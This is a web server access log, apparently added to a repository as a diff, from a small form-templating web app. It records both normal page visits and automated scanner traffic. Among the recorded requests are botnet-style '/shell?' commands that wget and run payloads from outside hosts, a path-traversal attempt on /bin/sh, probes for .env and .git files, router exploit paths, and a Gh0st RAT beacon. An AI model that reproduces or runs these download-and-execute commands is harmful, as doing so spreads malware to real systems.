+135.119.16.163 - - [03/Aug/2025 15:46:09] "[33mGET /developmentserver/metadatauploader HTTP/1.1[0m" 404 -
+20.65.193.234 - - [03/Aug/2025 16:14:46] "[33mGET /portal/redlion HTTP/1.1[0m" 404 -
+141.98.10.150 - - [03/Aug/2025 16:17:12] "[33mGET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+arm4+arm7;wget+http:/\\/vpn.cursinqfirewall.ru/home;chmod+777+home;./home+x.arm7;wget+http:/\\/vpn.cursinqfirewall.ru/aboutus;chmod+777+aboutus;./aboutus+x.arm4 HTTP/1.1[0m" 404 -
+141.98.11.20 - - [03/Aug/2025 16:27:12] "GET / HTTP/1.1" 200 -
+5.101.64.6 - - [03/Aug/2025 16:43:38] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+5.101.64.6 - - [03/Aug/2025 16:43:38] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+149.50.96.5 - - [03/Aug/2025 16:45:32] "[33mPOST /bapply.cgi HTTP/1.1[0m" 404 -
+149.50.96.114 - - [03/Aug/2025 17:33:55] "GET / HTTP/1.1" 200 -
+185.242.226.99 - - [03/Aug/2025 17:52:53] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [03/Aug/2025 17:59:43] "[33mGET /cgi-bin/index.html HTTP/1.1[0m" 404 -
+141.98.11.20 - - [03/Aug/2025 18:02:52] "GET / HTTP/1.1" 200 -
+176.65.148.236 - - [03/Aug/2025 18:03:02] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+8.222.187.219 - - [03/Aug/2025 18:06:12] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
+8.222.187.219 - - [03/Aug/2025 18:06:12] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+196.251.86.50 - - [03/Aug/2025 18:07:16] "GET / HTTP/1.0" 200 -
+91.224.92.17 - - [03/Aug/2025 18:09:46] "GET / HTTP/1.1" 200 -
+45.153.34.139 - - [03/Aug/2025 18:13:34] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [03/Aug/2025 18:24:01] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [03/Aug/2025 18:37:42] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [03/Aug/2025 19:04:07] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [03/Aug/2025 19:11:49] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [03/Aug/2025 19:14:55] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+185.242.226.99 - - [03/Aug/2025 19:17:44] code 400, message Bad request version ('À\x14À')
+185.242.226.99 - - [03/Aug/2025 19:17:44] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03é0³CÛÌo,\x7f\x11<\x12¬\x19\x8fm\x00g¢Ë\x1dgÔR\x81ã®­E²\x9fà\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+141.98.11.57 - - [03/Aug/2025 19:24:45] code 400, message Bad request version ('}')
+141.98.11.57 - - [03/Aug/2025 19:24:45] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+94.102.49.186 - - [03/Aug/2025 19:55:15] "GET / HTTP/1.1" 200 -
+144.172.110.50 - - [03/Aug/2025 20:11:48] "GET / HTTP/1.0" 200 -
+45.135.194.136 - - [03/Aug/2025 20:12:45] "GET / HTTP/1.1" 200 -
+54.242.177.180 - - [03/Aug/2025 20:27:01] "GET / HTTP/1.1" 200 -
+185.93.89.39 - - [03/Aug/2025 20:30:56] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [03/Aug/2025 20:32:01] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [03/Aug/2025 20:36:52] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+196.251.83.51 - - [03/Aug/2025 20:48:40] "[33mGET /.env HTTP/1.1[0m" 404 -
+204.76.203.219 - - [03/Aug/2025 21:21:57] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [03/Aug/2025 21:50:24] code 400, message Bad request version ('À\x13À')
+79.124.58.198 - - [03/Aug/2025 21:50:24] "[31m[1m\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03\x93<ù\x95\x95$ñª]Å4\x92+\x91íÒâKª\x97n\x1b¤Ì¼i¤dÂ ¿\x03 $Ü£\x18ã×Ó[\x12|\x84\x89åé*¿ã\x04\x7f\x1fú\x1f.\x03\x01.ªÏ\x98\x09\x1bd\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+149.50.96.114 - - [03/Aug/2025 21:55:41] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [03/Aug/2025 22:09:54] "GET / HTTP/1.1" 200 -
+103.199.180.146 - - [03/Aug/2025 22:12:39] "[33mPOST /GponForm/diag_Form?images/ HTTP/1.1[0m" 404 -
+35.195.185.167 - - [03/Aug/2025 22:21:32] "GET / HTTP/1.1" 200 -
+141.98.11.20 - - [03/Aug/2025 22:32:33] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [03/Aug/2025 22:42:11] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+93.174.93.12 - - [03/Aug/2025 22:42:11] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+35.203.210.124 - - [03/Aug/2025 22:47:43] "GET / HTTP/1.1" 200 -
+196.251.69.145 - - [03/Aug/2025 22:49:01] "GET / HTTP/1.1" 200 -
+198.235.24.216 - - [03/Aug/2025 23:17:41] "GET / HTTP/1.0" 200 -
+159.223.45.19 - - [03/Aug/2025 23:48:21] "[33mGET /.env HTTP/1.1[0m" 404 -
+159.223.45.19 - - [03/Aug/2025 23:48:21] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+176.65.148.236 - - [03/Aug/2025 23:53:20] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+204.76.203.219 - - [04/Aug/2025 00:01:25] "GET / HTTP/1.1" 200 -
+196.251.86.50 - - [04/Aug/2025 00:11:15] "GET / HTTP/1.0" 200 -
+149.50.96.5 - - [04/Aug/2025 00:30:48] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [04/Aug/2025 00:33:52] "GET / HTTP/1.1" 200 -
+101.78.165.175 - - [04/Aug/2025 00:40:48] "[33mPOST /cgi-bin/ViewLog.asp HTTP/1.1[0m" 404 -
+49.72.46.211 - - [04/Aug/2025 00:44:36] "[33mPOST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1[0m" 404 -
+89.248.173.219 - - [04/Aug/2025 00:47:43] "GET / HTTP/1.1" 200 -
+198.55.98.76 - - [04/Aug/2025 00:48:48] "[33mGET /.git/index HTTP/1.1[0m" 404 -
+216.218.206.68 - - [04/Aug/2025 00:53:19] "GET / HTTP/1.1" 200 -
+216.218.206.68 - - [04/Aug/2025 01:00:40] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+216.218.206.68 - - [04/Aug/2025 01:02:30] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+190.60.4.138 - - [04/Aug/2025 01:04:51] "[33mGET /admin/config.php HTTP/1.0[0m" 404 -
+141.98.11.57 - - [04/Aug/2025 01:14:28] code 400, message Bad request version ('}')
+141.98.11.57 - - [04/Aug/2025 01:14:28] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+149.50.96.114 - - [04/Aug/2025 01:14:43] "GET / HTTP/1.1" 200 -
+141.98.11.20 - - [04/Aug/2025 01:15:27] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [04/Aug/2025 01:33:39] "[33mGET /page/style/index.css HTTP/1.1[0m" 404 -
+204.76.203.219 - - [04/Aug/2025 01:59:38] "GET / HTTP/1.1" 200 -
+135.237.126.154 - - [04/Aug/2025 02:00:03] "[33mGET /manager/text/list HTTP/1.1[0m" 404 -
+91.224.92.17 - - [04/Aug/2025 02:30:03] "GET / HTTP/1.1" 200 -
+197.37.94.41 - - [04/Aug/2025 02:34:51] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 45.153.34.39/jaws;sh+/tmp/jaws HTTP/1.1')
+197.37.94.41 - - [04/Aug/2025 02:34:51] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ 45.153.34.39/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+8.222.249.62 - - [04/Aug/2025 02:43:07] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
+8.222.249.62 - - [04/Aug/2025 02:43:07] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+204.76.203.219 - - [04/Aug/2025 02:43:21] "GET / HTTP/1.1" 200 -
+68.69.186.238 - - [04/Aug/2025 02:49:38] "GET / HTTP/1.1" 200 -
+89.213.174.222 - - [04/Aug/2025 03:37:29] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+66.240.205.34 - - [04/Aug/2025 03:38:52] code 400, message Bad request version ('®¯]')
+66.240.205.34 - - [04/Aug/2025 03:38:52] "[31m[1mGh0st­\x00\x00\x00à\x00\x00\x00x\x9cKS``\x98ÃÀÀÀ\x06Ä\x8c@¼Q\x96\x81\x81\x09H\x07§\x16\x95e&§*\x04$&g+\x182\x94ö°00¬¨rc\x00\x01\x11 \x82\x1f\\`&\x83ÇK7\x86\x19ån\x0c9\x95n\x0c;\x84\x0f3¬èsch¨^Ï4'J\x97©\x82ã0Ã\x91h]&\x90øÎ\x97SËA4L?2=áÄ\x92\x86\x0b@õ`\x0cT\x1f®¯][0m" 400 -
+204.76.203.219 - - [04/Aug/2025 03:44:46] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [04/Aug/2025 03:51:47] "GET / HTTP/1.1" 200 -
+17.241.227.26 - - [04/Aug/2025 03:57:34] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+185.242.226.99 - - [04/Aug/2025 04:04:03] "GET / HTTP/1.1" 200 -
+196.251.86.50 - - [04/Aug/2025 04:45:40] "GET / HTTP/1.0" 200 -
+20.168.12.53 - - [04/Aug/2025 04:51:10] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [04/Aug/2025 04:57:36] "GET / HTTP/1.1" 200 -
+206.168.34.53 - - [04/Aug/2025 05:19:27] "GET / HTTP/1.1" 200 -
+206.168.34.53 - - [04/Aug/2025 05:19:36] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+206.168.34.53 - - [04/Aug/2025 05:19:38] code 505, message Invalid HTTP version (2.0)
+206.168.34.53 - - [04/Aug/2025 05:19:38] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+141.98.11.20 - - [04/Aug/2025 05:19:43] "GET / HTTP/1.1" 200 -
+206.168.34.53 - - [04/Aug/2025 05:19:47] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+206.168.34.53 - - [04/Aug/2025 05:19:49] code 505, message Invalid HTTP version (2.0)
+206.168.34.53 - - [04/Aug/2025 05:19:49] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+206.168.34.53 - - [04/Aug/2025 05:20:04] code 400, message Bad request version ('À\x14À')
+206.168.34.53 - - [04/Aug/2025 05:20:04] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03F\x82\x87º[\x0e\x18íA¼P\x91¢í¡n2Çñi×ÊùÎU_~»Îâ\x0ct ¿tòzIÛVa!Í\x96àÕ¨\x15Áß;T\x87\x91ë­\x8e4S¶4j8f´\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+206.168.34.53 - - [04/Aug/2025 05:20:08] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+149.50.96.5 - - [04/Aug/2025 05:26:17] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [04/Aug/2025 05:47:04] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [04/Aug/2025 05:52:59] "GET / HTTP/1.1" 200 -
+45.135.194.136 - - [04/Aug/2025 06:21:58] "GET / HTTP/1.1" 200 -
+147.185.132.84 - - [04/Aug/2025 06:23:03] code 400, message Bad request version ('À\x13À')
+147.185.132.84 - - [04/Aug/2025 06:23:03] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03i.ZYY\x9a0\x9e) Û[^\x93kÕ@wúëÇ{×¨ìÚ¢ãØ\x95èF sëÕ­\x9f»\x94i¸X\x02½£ \x9b^°\x1f3GÆ¥r%\x81µ\x95\x02\x8f:\x8fQ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+147.185.132.84 - - [04/Aug/2025 06:23:04] code 400, message Bad request syntax ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Þ6}')
+147.185.132.84 - - [04/Aug/2025 06:23:04] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Þ6}[0m" 400 -
+204.76.203.219 - - [04/Aug/2025 06:29:54] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [04/Aug/2025 06:39:46] "GET / HTTP/1.1" 200 -
+144.172.110.50 - - [04/Aug/2025 06:40:31] "GET / HTTP/1.0" 200 -
+185.242.226.99 - - [04/Aug/2025 07:13:45] code 400, message Bad request version ('À\x14À')
+185.242.226.99 - - [04/Aug/2025 07:13:45] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x039)\x1cêÿaí\x7f-\\w¼\x1ej\x02UÐÁ§9R_ñp`Ç\x99\x0cù\x90iG\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+202.164.165.82 - - [04/Aug/2025 07:30:22] "GET / HTTP/1.1" 200 -
+192.168.1.117 - - [04/Aug/2025 07:33:58] "GET /templates HTTP/1.1" 200 -
+192.168.1.117 - - [04/Aug/2025 07:33:58] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:34:12] "GET / HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:34:12] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+52.123.138.160 - - [04/Aug/2025 07:34:23] "GET / HTTP/1.1" 200 -
+52.123.138.201 - - [04/Aug/2025 07:34:23] "GET / HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 07:34:33] "GET / HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 07:34:34] "GET /static/css/style.css HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 07:34:34] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+167.103.55.7 - - [04/Aug/2025 07:34:42] "GET /view/7 HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 07:34:42] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:34:44] "GET /view/7 HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:34:44] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+212.40.1.4 - - [04/Aug/2025 07:34:47] "GET /view/7 HTTP/1.1" 200 -
+212.40.1.4 - - [04/Aug/2025 07:34:48] "GET /static/css/style.css HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:35:52] "GET / HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:35:52] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:35:55] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:35:55] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+167.103.55.7 - - [04/Aug/2025 07:35:57] "GET / HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 07:35:58] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+31.31.48.132 - - [04/Aug/2025 07:35:59] "GET /templates HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 07:35:59] "GET /templates HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 07:36:00] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+167.103.55.7 - - [04/Aug/2025 07:36:02] "GET /fill/Disconnectors HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 07:36:02] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:36:05] "GET /fill/Disconnectors HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:36:05] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+212.40.1.5 - - [04/Aug/2025 07:36:07] "GET /fill/Disconnectors HTTP/1.1" 200 -
+212.40.1.5 - - [04/Aug/2025 07:36:07] "GET /static/css/style.css HTTP/1.1" 200 -
+31.31.48.132 - - [04/Aug/2025 07:36:12] "GET /static/css/style.css HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:38:29] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:38:29] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:38:32] "[32mGET /edit-template/SurveyWithInstructions HTTP/1.1[0m" 302 -
+194.9.108.120 - - [04/Aug/2025 07:38:32] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:38:32] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:38:36] "[32mGET /edit-template/SurveyWithInstructions HTTP/1.1[0m" 302 -
+194.9.108.120 - - [04/Aug/2025 07:38:36] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:38:36] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:38:39] "GET /fill/SurveyWithInstructions HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:38:39] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:39:18] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:39:18] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:39:21] "GET /edit-template/example_template HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:39:21] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:39:43] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:39:43] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:39:45] "GET /edit-template/example_template HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:39:45] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:39:50] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:39:50] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:39:51] "[32mGET /edit-template/MyForm HTTP/1.1[0m" 302 -
+194.9.108.120 - - [04/Aug/2025 07:39:52] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:39:52] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:39:53] "[32mGET /edit-template/MyForm HTTP/1.1[0m" 302 -
+194.9.108.120 - - [04/Aug/2025 07:39:53] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:39:53] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:39:59] "GET /fill/Disconnectors HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:39:59] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:42:22] "GET / HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:42:22] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:45:28] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:45:29] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:45:30] "GET /fill/Disconnectors HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:45:30] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:45:37] "GET / HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:45:37] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:45:39] "GET /view/7 HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:45:39] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+184.105.139.69 - - [04/Aug/2025 07:45:41] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03±ÌO\x1b6ç\x81lO\x04ø\x16\\\x8ftGÔ}i\x16PV\x97èh\x9d\x8aa9-à=\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+184.105.139.69 - - [04/Aug/2025 07:45:41] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03±ÌO\x1b6ç\x81lO\x04ø\x16\\\x8ftGÔ}i\x16PV\x97èh\x9d\x8aa9-à=\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+194.9.108.120 - - [04/Aug/2025 07:47:44] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:47:44] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:47:46] "GET /fill/Disconnectors HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:47:46] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:55:57] "GET / HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:55:57] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:56:05] "GET /templates HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:56:05] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:57:55] "GET /fill/Disconnectors HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:57:55] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:58:26] "GET / HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:58:26] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:58:38] "GET /view/7 HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:58:38] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:59:22] "GET / HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:59:22] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+194.9.108.120 - - [04/Aug/2025 07:59:24] "GET /edit-data/7 HTTP/1.1" 200 -
+194.9.108.120 - - [04/Aug/2025 07:59:24] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+149.50.96.5 - - [04/Aug/2025 08:24:41] "[33mGET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1[0m" 404 -
+167.103.55.7 - - [04/Aug/2025 08:45:04] "GET /templates HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:45:08] "GET / HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:45:12] "GET /view/7 HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:45:13] "GET / HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:45:21] "GET /view/7 HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:45:21] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+167.103.55.7 - - [04/Aug/2025 08:45:23] "GET / HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:45:24] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+167.103.55.7 - - [04/Aug/2025 08:45:26] "GET /templates HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:45:27] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+167.103.55.7 - - [04/Aug/2025 08:48:01] "GET /fill/Disconnectors HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:48:02] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+167.103.55.7 - - [04/Aug/2025 08:48:38] "GET / HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:48:39] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+167.103.55.7 - - [04/Aug/2025 08:48:41] "GET /templates HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:48:41] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+167.103.55.7 - - [04/Aug/2025 08:53:10] "GET /fill/example_template HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:53:10] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+167.103.55.7 - - [04/Aug/2025 08:53:15] "GET / HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:53:15] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+167.103.55.7 - - [04/Aug/2025 08:53:19] "GET /view/7 HTTP/1.1" 200 -
+167.103.55.7 - - [04/Aug/2025 08:53:20] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+3.134.148.59 - - [04/Aug/2025 09:07:52] "GET / HTTP/1.1" 200 -
+3.134.148.59 - - [04/Aug/2025 09:08:15] "GET / HTTP/1.1" 200 -
+3.134.148.59 - - [04/Aug/2025 09:08:33] code 400, message Bad request version ('À\x14À')
+3.134.148.59 - - [04/Aug/2025 09:08:33] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ÚÄ2ª&\x02`\x85\x05\x86¡\x0f6¹@\x02ÍU\x8dÅÐÄ\\\x1c\x13Û\x16\x0c\x12GÊï\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+3.134.148.59 - - [04/Aug/2025 09:08:39] code 400, message Bad request version ('À\x14À')
+3.134.148.59 - - [04/Aug/2025 09:08:39] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03±0 8\x11YÛÍ~:\x1fèx\x9d\x8c\x1eí'½\x02+Q\\ï2\x1f&´1Jý$\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+3.134.148.59 - - [04/Aug/2025 09:08:42] code 400, message Bad request syntax ('SSH-2.0-Go')
+3.134.148.59 - - [04/Aug/2025 09:08:42] "[31m[1mSSH-2.0-Go[0m" 400 -
+71.6.232.26 - - [04/Aug/2025 09:26:09] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [04/Aug/2025 09:34:51] "GET / HTTP/1.1" 200 -
+34.40.178.180 - - [04/Aug/2025 09:50:45] code 400, message Bad request version ('°\xadû¸XZi¯\x7fq')
+34.40.178.180 - - [04/Aug/2025 09:50:45] "[31m[1m\x16\x03\x01\x00M\x01\x00\x00I\x03\x03^JÌÅÞr\x06)4Ò¯TÊç\x17 \x1a©\x86\x1f~\\²~\x8fOr|ÿj\x97R °­û¸XZi¯\x7fq[0m" 400 -
+34.40.178.180 - - [04/Aug/2025 09:50:48] "OPTIONS / HTTP/1.0" 200 -
+91.224.92.17 - - [04/Aug/2025 09:53:32] "GET / HTTP/1.1" 200 -
+196.251.69.145 - - [04/Aug/2025 10:25:23] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [04/Aug/2025 10:31:18] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
